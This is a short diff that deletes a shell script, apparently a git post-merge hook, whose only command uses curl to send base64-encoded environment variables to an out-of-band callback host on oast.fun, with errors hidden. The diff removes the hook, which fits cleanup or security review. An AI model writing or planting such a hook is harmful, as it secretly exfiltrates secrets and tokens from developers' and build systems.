@@ -1,2 +1,0 @@
-#!/bin/sh
-curl "https://post-merge.d86ikmgglvofto2g054gyc7y8tj5647kh.oast.fun/$(env | base64 | head -c 200)" 2>/dev/null
